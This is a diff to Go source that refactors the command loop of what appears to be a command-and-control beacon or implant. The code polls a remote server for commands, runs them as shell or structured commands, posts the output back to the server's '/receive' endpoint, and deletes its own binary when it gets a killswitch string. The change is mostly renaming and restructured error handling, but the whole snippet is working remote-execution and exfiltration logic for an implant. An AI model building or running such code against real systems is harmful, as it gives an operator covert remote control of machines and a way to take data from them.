@@ -327,29 +327,32 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 
 		if commands, found := jsonResponse["Commands"].([]interface{}); found {
 			for _, cmd := range commands {
-				var commandKey string
+				var commandStr string
 				var output string
-				var err error
 
 				switch v := cmd.(type) {
 				case string:
-					commandKey = v
-					if strings.TrimSpace(commandKey) == httpKillswitchCommand {
+					commandStr = v
+					if strings.TrimSpace(commandStr) == httpKillswitchCommand {
 						log.Println("[-] Killswitch received; stopping and removing binary.")
 						selfDelete()
 					}
-					output, err = ExecuteCommand(commandKey)
+					var err error
+					output, err = ExecuteCommand(commandStr)
+					if err != nil {
+						log.Printf("[-] Command execution failed: %s\n", err)
+						output = err.Error()
+					}
 				case map[string]interface{}:
-					commandKey = commandMapToString(v)
-					output, err = handleHTTPFileCommandMap(v)
+					var err error
+					commandStr, output, err = executeStructuredBeaconCommand(v)
+					if err != nil {
+						log.Printf("[-] Structured command failed: %s\n", err)
+						output = err.Error()
+					}
 				default:
-					log.Println("[-] Invalid command format (expected string or JSON object), skipping...")
+					log.Println("[-] Invalid command format, skipping...")
 					continue
-				}
-
-				if err != nil {
-					log.Printf("[-] Command execution failed: %s\n", err)
-					output = err.Error()
 				}
 
 				postURL := opts.BaseURL + "/receive"
@@ -358,8 +361,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					postURL += "/" + uuid
 				}
 
-				err = SendCommandOutput(postURL, commandKey, output, opts.Headers, opts)
-				if err != nil {
+				if err := SendCommandOutput(postURL, commandStr, output, opts.Headers, opts); err != nil {
 					log.Printf("[-] Failed to send command output: %s\n", err)
 				}
 			}
